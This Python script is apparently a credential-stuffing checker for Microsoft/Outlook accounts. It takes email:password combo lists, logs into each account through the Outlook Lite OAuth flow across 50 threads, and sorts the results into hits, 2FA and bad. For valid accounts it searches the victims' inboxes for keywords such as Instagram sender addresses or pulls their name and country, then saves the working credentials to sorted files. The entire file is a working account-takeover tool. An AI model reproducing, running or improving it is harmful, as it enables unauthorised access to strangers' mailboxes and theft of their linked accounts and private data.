#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import time
import uuid
import threading
from pathlib import Path
from collections import defaultdict
from datetime import datetime

import requests
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.layout import Layout
from rich import box
from concurrent.futures import ThreadPoolExecutor

# ==============================================================
# ألوان متناسقة ومتنوعة (بدون هيمنة لون واحد)
# ==============================================================
STYLE_MAIN_TITLE = "bold blue"          # عنوان رئيسي (أزرق)
STYLE_PROGRESS = "green"                 # شريط التقدم (أخضر)
STYLE_HITS = "green"                     # ✅ HITS (أخضر)
STYLE_2FA = "yellow"                     # 🔐 2FA (أصفر)
STYLE_BAD = "red"                        # ❌ BAD (أحمر)
STYLE_ERROR = "magenta"                  # ⚠️ ERRORS (أرجواني)
STYLE_KEYWORD = "white"                  # الكلمات المفتاحية (أبيض)
STYLE_COUNTRY = "white"                  # أسماء البلدان (أبيض)
STYLE_NUMBER = "cyan"                    # الأرقام والإحصائيات (سماوي خفيف)
STYLE_TABLE_HEADER = "bold yellow"       # رؤوس الجداول (أصفر غامق)
STYLE_BORDER = "bright_blue"             # حدود الإطارات (أزرق فاتح)
STYLE_CREDITS = "bright_black"           # حقوق المطور (رمادي)

CONSOLE = Console()

# ==============================================================
# علم الدولة
# ==============================================================
def flag_emoji(code: str) -> str:
    if not code or len(code) != 2:
        return "🏳️"
    return chr(ord(code[0]) + 0x1F1A5) + chr(ord(code[1]) + 0x1F1A5)

# ==============================================================
# دوال الفحص الأساسية (من الكود الأصلي، لم يتم تغييرها)
# ==============================================================
class MicrosoftAccountChecker:
    def __init__(self, debug=False):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug

    def get_oauth_tokens(self, email):
        url = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": self.uuid,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
        }
        try:
            r = self.session.get(url, headers=headers, timeout=15)
            if "MSAccount" not in r.text:
                return None, None, "BAD"
            auth_url = (
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
                f"&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            r2 = self.session.get(auth_url, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return None, None, "BAD"
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            return post_url, ppft, "OK"
        except Exception as e:
            return None, None, "ERROR"

    def login(self, email, password, post_url, ppft):
        login_data = (
            f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
            f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}"
            f"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
            f"&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
            f"&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
            f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        )
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        try:
            r = self.session.post(post_url, data=login_data, headers=headers, allow_redirects=False, timeout=15)
            txt = r.text.lower()
            if "account or password is incorrect" in txt or "password is incorrect" in txt:
                return None, "BAD"
            if "identity/confirm" in txt or "consent" in txt:
                return None, "2FA"
            if "abuse" in txt:
                return None, "BAD"
            loc = r.headers.get("Location", "")
            if not loc:
                return None, "BAD"
            m = re.search(r'code=([^&]+)', loc)
            if not m:
                return None, "BAD"
            return m.group(1), "SUCCESS"
        except Exception:
            return None, "ERROR"

    def get_access_token(self, code):
        token_data = (
            f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            f"&grant_type=authorization_code&code={code}"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        )
        try:
            r = requests.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                              data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"},
                              timeout=15)
            if r.status_code == 200:
                return r.json().get("access_token")
        except:
            pass
        return None

    def get_profile(self, access_token, cid):
        name = ""
        country = ""
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}"
        }
        try:
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=15)
            if r.status_code == 200:
                data = r.json()
                name = data.get("displayName") or data.get("givenName") or ""
                loc = data.get("location")
                if isinstance(loc, str):
                    parts = [p.strip() for p in loc.split(',')]
                    if parts:
                        country = parts[-1]
                elif isinstance(loc, dict):
                    country = loc.get("country") or loc.get("countryOrRegion") or loc.get("countryCode") or ""
                if not country:
                    country = data.get("country") or data.get("countryOrRegion") or ""
        except:
            pass
        return name, country

    def search_keyword(self, access_token, cid, keyword):
        query = keyword
        if '@' in keyword and ' ' not in keyword:
            query = f'from:"{keyword}" OR "{keyword}"'
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                "From": 0,
                "Query": {"QueryString": query},
                "Size": 1,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }],
            "LogicalId": str(uuid.uuid4())
        }
        headers = {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        try:
            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data.get("EntitySets") and data["EntitySets"][0].get("ResultSets"):
                    return data["EntitySets"][0]["ResultSets"][0].get("Total", 0)
        except:
            pass
        return 0

    def inbox_check(self, email, password, keywords):
        result = {"status": "BAD", "email": email, "password": password, "keyword_counts": {}}
        try:
            post_url, ppft, st = self.get_oauth_tokens(email)
            if st != "OK":
                return result
            code, login_st = self.login(email, password, post_url, ppft)
            if login_st == "2FA":
                result["status"] = "2FA"
                return result
            if login_st != "SUCCESS" or not code:
                return result
            token = self.get_access_token(code)
            if not token:
                return result
            cid = self.session.cookies.get("MSPCID", "").upper()
            if not cid:
                return result
            counts = {}
            for kw in keywords:
                cnt = self.search_keyword(token, cid, kw)
                if cnt > 0:
                    counts[kw] = cnt
            if counts:
                result["status"] = "HIT"
                result["keyword_counts"] = counts
            else:
                result["status"] = "NO_MATCH"
            return result
        except:
            result["status"] = "ERROR"
            return result

    def country_check(self, email, password):
        result = {"status": "BAD", "email": email, "password": password, "name": "", "country": ""}
        try:
            post_url, ppft, st = self.get_oauth_tokens(email)
            if st != "OK":
                return result
            code, login_st = self.login(email, password, post_url, ppft)
            if login_st == "2FA":
                result["status"] = "2FA"
                return result
            if login_st != "SUCCESS" or not code:
                return result
            token = self.get_access_token(code)
            if not token:
                return result
            cid = self.session.cookies.get("MSPCID", "").upper()
            if not cid:
                return result
            name, country = self.get_profile(token, cid)
            result["status"] = "HIT"
            result["name"] = name
            result["country"] = country
            return result
        except:
            result["status"] = "ERROR"
            return result

# ==============================================================
# إدارة الإحصائيات والنتائج
# ==============================================================
class Stats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.twofa = 0
        self.bad = 0
        self.errors = 0
        self.start = time.time()
        self.lock = threading.Lock()
        self.keyword_hits = defaultdict(int)
        self.country_hits = defaultdict(int)

    def update(self, status, keyword_counts=None, country=""):
        with self.lock:
            self.checked += 1
            if status == "HIT":
                self.hits += 1
                if keyword_counts:
                    for kw, cnt in keyword_counts.items():
                        self.keyword_hits[kw] += 1
                if country:
                    self.country_hits[country] += 1
            elif status == "2FA":
                self.twofa += 1
            elif status == "BAD":
                self.bad += 1
            else:
                self.errors += 1

    def progress(self):
        return (self.checked / self.total * 100) if self.total else 0

    def cpm(self):
        elapsed = max(0.001, time.time() - self.start)
        return (self.checked / elapsed) * 60

    def elapsed(self):
        return time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start))

    def remaining(self):
        c = self.cpm()
        if c <= 0:
            return "00:00:00"
        rem = (self.total - self.checked) / (c / 60)
        return time.strftime("%H:%M:%S", time.gmtime(rem))

class ResultManager:
    def __init__(self, mode):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base = Path(f"Results/{mode}_{ts}")
        self.base.mkdir(parents=True, exist_ok=True)
        self.all_hits = self.base / "all_hits.txt"
        self.twofa = self.base / "2FA.txt"
        self.countries = self.base / "countries"
        self.keywords = self.base / "keywords"

    def save_hit(self, email, password, name="", country="", keyword_counts=None):
        with open(self.all_hits, 'a', encoding='utf-8') as f:
            line = f"{email}:{password}"
            if name or country:
                line += f" | {name} | {country}"
            f.write(line + "\n")
        if country:
            self.countries.mkdir(exist_ok=True)
            safe = re.sub(r'[^\w\-]', '_', country)
            with open(self.countries / f"{safe}.txt", 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
        if keyword_counts:
            self.keywords.mkdir(exist_ok=True)
            for kw, cnt in keyword_counts.items():
                safe_kw = re.sub(r'[^\w\-@.]', '_', kw)
                with open(self.keywords / f"{safe_kw}.txt", 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | {cnt} emails\n")

    def save_2fa(self, email, password):
        with open(self.twofa, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

# ==============================================================
# واجهات المستخدم (داشبورد غني بالألوان)
# ==============================================================
def logo_panel():
    ascii_logo = r"""
  ███╗   ███╗██╗   ██╗██████╗ ██████╗ ██╗  ██╗██╗   ██╗
  ████╗ ████║██║   ██║██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝
  ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║ ╚████╔╝
  ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║  ╚██╔╝
  ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║   ██║
  ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝
    """
    return Panel(Text(ascii_logo, style=STYLE_MAIN_TITLE), box=box.ROUNDED, border_style=STYLE_BORDER)

def credits_panel():
    cred = (
        f"Owner: @Murphython  |  GitHub: https://github.com/sadikmahedi88\n"
        f"Channel: https://t.me/+sz0r3wI5y6cwMjg0  |  Chat: https://t.me/+4qJCWjTjtn4xMTFk"
    )
    return Panel(Text(cred, style=STYLE_CREDITS), box=box.ROUNDED, border_style=STYLE_CREDITS)

def inbox_dashboard(stats: Stats, total: int, keywords: list) -> Panel:
    s = stats
    percent = s.progress()
    bar_len = 40
    filled = int(bar_len * percent / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    progress_text = Text(f"Progress: {bar} {percent:.1f}% ({s.checked}/{total})", style=STYLE_PROGRESS)

    stats_row = Text()
    stats_row.append("✅ HITS: ", style=STYLE_HITS)
    stats_row.append(str(s.hits), style=STYLE_NUMBER)
    stats_row.append("   🔐 2FA: ", style=STYLE_2FA)
    stats_row.append(str(s.twofa), style=STYLE_NUMBER)
    stats_row.append("   ❌ BAD: ", style=STYLE_BAD)
    stats_row.append(str(s.bad), style=STYLE_NUMBER)
    stats_row.append("   ⚠️ ERR: ", style=STYLE_ERROR)
    stats_row.append(str(s.errors), style=STYLE_NUMBER)

    kw_table = Table(title="🎯 KEYWORD MATCHES", box=box.ROUNDED, border_style=STYLE_BORDER, header_style=STYLE_TABLE_HEADER)
    kw_table.add_column("Keyword", style=STYLE_KEYWORD, no_wrap=True)
    kw_table.add_column("Hits", style=STYLE_NUMBER, justify="right")
    kw_table.add_column("Progress", style=STYLE_PROGRESS)
    for kw in keywords:
        cnt = s.keyword_hits.get(kw, 0)
        kw_percent = (cnt / max(s.hits, 1)) * 100
        kw_filled = int(30 * kw_percent / 100)
        kw_bar = "█" * kw_filled + "░" * (30 - kw_filled)
        kw_table.add_row(kw, str(cnt), kw_bar)

    perf_table = Table(title="🚀 PERFORMANCE", box=box.ROUNDED, border_style=STYLE_BORDER, header_style=STYLE_TABLE_HEADER)
    perf_table.add_column("Metric", style=STYLE_TABLE_HEADER)
    perf_table.add_column("Value", style=STYLE_NUMBER)
    perf_table.add_row("CPM", f"{s.cpm():.1f}")
    perf_table.add_row("ELAPSED", s.elapsed())
    perf_table.add_row("REMAINING", s.remaining())

    layout = Layout()
    layout.split(
        Layout(name="logo", size=9),
        Layout(name="progress", size=3),
        Layout(name="stats", size=2),
        Layout(name="kw_table"),
        Layout(name="perf_table", size=5),
        Layout(name="credits", size=4),
    )
    layout["logo"].update(logo_panel())
    layout["progress"].update(Panel(progress_text, border_style=STYLE_BORDER))
    layout["stats"].update(Panel(stats_row, border_style=STYLE_BORDER))
    layout["kw_table"].update(Panel(kw_table, border_style=STYLE_BORDER))
    layout["perf_table"].update(Panel(perf_table, border_style=STYLE_BORDER))
    layout["credits"].update(credits_panel())
    return Panel(layout, box=box.DOUBLE_EDGE, border_style=STYLE_BORDER)

def country_dashboard(stats: Stats, total: int) -> Panel:
    s = stats
    percent = s.progress()
    bar_len = 40
    filled = int(bar_len * percent / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    progress_text = Text(f"Progress: {bar} {percent:.1f}% ({s.checked}/{total})", style=STYLE_PROGRESS)

    stats_row = Text()
    stats_row.append("✅ HITS: ", style=STYLE_HITS)
    stats_row.append(str(s.hits), style=STYLE_NUMBER)
    stats_row.append("   🔐 2FA: ", style=STYLE_2FA)
    stats_row.append(str(s.twofa), style=STYLE_NUMBER)
    stats_row.append("   ❌ BAD: ", style=STYLE_BAD)
    stats_row.append(str(s.bad), style=STYLE_NUMBER)
    stats_row.append("   ⚠️ ERR: ", style=STYLE_ERROR)
    stats_row.append(str(s.errors), style=STYLE_NUMBER)

    country_table = Table(title="🌍 COUNTRIES DISTRIBUTION", box=box.ROUNDED, border_style=STYLE_BORDER, header_style=STYLE_TABLE_HEADER)
    country_table.add_column("Country", style=STYLE_COUNTRY, no_wrap=True)
    country_table.add_column("Hits", style=STYLE_NUMBER, justify="right")
    country_table.add_column("Progress", style=STYLE_PROGRESS)
    for country, cnt in sorted(s.country_hits.items(), key=lambda x: -x[1]):
        flag = flag_emoji(country[:2]) if len(country) >= 2 else "🏳️"
        display = f"{flag} {country[:28]}"
        kw_percent = (cnt / max(s.hits, 1)) * 100
        kw_filled = int(30 * kw_percent / 100)
        kw_bar = "█" * kw_filled + "░" * (30 - kw_filled)
        country_table.add_row(display, str(cnt), kw_bar)

    perf_table = Table(title="🚀 PERFORMANCE", box=box.ROUNDED, border_style=STYLE_BORDER, header_style=STYLE_TABLE_HEADER)
    perf_table.add_column("Metric", style=STYLE_TABLE_HEADER)
    perf_table.add_column("Value", style=STYLE_NUMBER)
    perf_table.add_row("CPM", f"{s.cpm():.1f}")
    perf_table.add_row("ELAPSED", s.elapsed())
    perf_table.add_row("REMAINING", s.remaining())

    layout = Layout()
    layout.split(
        Layout(name="logo", size=9),
        Layout(name="progress", size=3),
        Layout(name="stats", size=2),
        Layout(name="country_table"),
        Layout(name="perf_table", size=5),
        Layout(name="credits", size=4),
    )
    layout["logo"].update(logo_panel())
    layout["progress"].update(Panel(progress_text, border_style=STYLE_BORDER))
    layout["stats"].update(Panel(stats_row, border_style=STYLE_BORDER))
    layout["country_table"].update(Panel(country_table, border_style=STYLE_BORDER))
    layout["perf_table"].update(Panel(perf_table, border_style=STYLE_BORDER))
    layout["credits"].update(credits_panel())
    return Panel(layout, box=box.DOUBLE_EDGE, border_style=STYLE_BORDER)

# ==============================================================
# تنفيذ أوضاع الفحص
# ==============================================================
def run_inbox_searcher():
    CONSOLE.clear()
    CONSOLE.print(logo_panel())
    acc_file = CONSOLE.input("[bold blue][?][/] Accounts file (email:password): ").strip()
    if not os.path.exists(acc_file):
        CONSOLE.print("[red]File not found.[/]")
        return
    with open(acc_file, 'r', encoding='utf-8') as f:
        combos = [l.strip() for l in f if l.strip() and ':' in l]
    if not combos:
        CONSOLE.print("[red]No valid combos.[/]")
        return

    kw_choice = CONSOLE.input("[bold blue][?][/] Load keywords from file? (y/n): ").strip().lower()
    keywords = []
    if kw_choice == 'y':
        kw_file = CONSOLE.input("[bold blue][?][/] Keyword file path: ").strip()
        if os.path.exists(kw_file):
            with open(kw_file, 'r', encoding='utf-8') as f:
                keywords = [l.strip() for l in f if l.strip()]
        else:
            CONSOLE.print("[red]File not found, manual entry.[/]")
    if not keywords:
        CONSOLE.print("[bold yellow]Enter keywords (one per line, empty to finish):[/]")
        while True:
            kw = CONSOLE.input().strip()
            if not kw:
                break
            keywords.append(kw)
    if not keywords:
        CONSOLE.print("[red]No keywords, aborting.[/]")
        return

    total = len(combos)
    stats = Stats(total)
    result_mgr = ResultManager("InboxSearch")
    stop = threading.Event()

    def display():
        with Live(inbox_dashboard(stats, total, keywords), refresh_per_second=2, screen=True) as live:
            while not stop.is_set():
                live.update(inbox_dashboard(stats, total, keywords))
                time.sleep(0.5)
    display_thread = threading.Thread(target=display, daemon=True)
    display_thread.start()

    def process(line):
        try:
            email, pwd = line.split(':', 1)
            checker = MicrosoftAccountChecker(debug=False)
            res = checker.inbox_check(email.strip(), pwd.strip(), keywords)
            if res["status"] == "HIT":
                stats.update("HIT", keyword_counts=res["keyword_counts"])
                result_mgr.save_hit(email, pwd, keyword_counts=res["keyword_counts"])
            elif res["status"] == "2FA":
                stats.update("2FA")
                result_mgr.save_2fa(email, pwd)
            elif res["status"] == "NO_MATCH":
                stats.update("HIT")
                result_mgr.save_hit(email, pwd)
            else:
                stats.update("BAD")
        except:
            stats.update("ERROR")

    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(process, combos)
    stop.set()
    display_thread.join(timeout=1)
    CONSOLE.clear()
    CONSOLE.print(inbox_dashboard(stats, total, keywords))
    CONSOLE.print(f"\n[green]✅ Results saved in: {result_mgr.base}[/]")
    CONSOLE.input("\n[bold blue]Press Enter to return...[/]")

def run_country_filter():
    CONSOLE.clear()
    CONSOLE.print(logo_panel())
    acc_file = CONSOLE.input("[bold blue][?][/] Accounts file (email:password): ").strip()
    if not os.path.exists(acc_file):
        CONSOLE.print("[red]File not found.[/]")
        return
    with open(acc_file, 'r', encoding='utf-8') as f:
        combos = [l.strip() for l in f if l.strip() and ':' in l]
    if not combos:
        CONSOLE.print("[red]No valid combos.[/]")
        return

    total = len(combos)
    stats = Stats(total)
    result_mgr = ResultManager("CountryFilter")
    stop = threading.Event()

    def display():
        with Live(country_dashboard(stats, total), refresh_per_second=2, screen=True) as live:
            while not stop.is_set():
                live.update(country_dashboard(stats, total))
                time.sleep(0.5)
    display_thread = threading.Thread(target=display, daemon=True)
    display_thread.start()

    def process(line):
        try:
            email, pwd = line.split(':', 1)
            checker = MicrosoftAccountChecker(debug=False)
            res = checker.country_check(email.strip(), pwd.strip())
            if res["status"] == "HIT":
                stats.update("HIT", country=res["country"])
                result_mgr.save_hit(email, pwd, name=res["name"], country=res["country"])
            elif res["status"] == "2FA":
                stats.update("2FA")
                result_mgr.save_2fa(email, pwd)
            else:
                stats.update("BAD")
        except:
            stats.update("ERROR")

    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(process, combos)
    stop.set()
    display_thread.join(timeout=1)
    CONSOLE.clear()
    CONSOLE.print(country_dashboard(stats, total))
    CONSOLE.print(f"\n[green]✅ Results saved in: {result_mgr.base}[/]")
    CONSOLE.input("\n[bold blue]Press Enter to return...[/]")

# ==============================================================
# القائمة الرئيسية
# ==============================================================
def main():
    CONSOLE.clear()
    CONSOLE.print(logo_panel())
    menu_text = Text()
    menu_text.append("⚙️  MAIN MENU - SELECT SCANNING MODE\n\n", style=STYLE_MAIN_TITLE)
    menu_text.append("[1] 📬 INBOX SEARCHER\n", style=STYLE_HITS)
    menu_text.append("    Search for specific keywords in your inbox (e.g., noreply@instagram.com)\n\n", style="white")
    menu_text.append("[2] 🌍 COUNTRY FILTER\n", style=STYLE_2FA)
    menu_text.append("    Fetch account profile (name, country) and sort results by country\n", style="white")
    menu_panel = Panel(menu_text, box=box.ROUNDED, border_style=STYLE_BORDER)
    CONSOLE.print(menu_panel)
    CONSOLE.print(credits_panel())
    choice = CONSOLE.input("\n[bold blue]Select [1/2]: [/]").strip()
    if choice == "1":
        run_inbox_searcher()
    elif choice == "2":
        run_country_filter()
    else:
        CONSOLE.print("[red]Invalid choice.[/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        CONSOLE.print("\n[yellow]Interrupted. Exiting...[/]")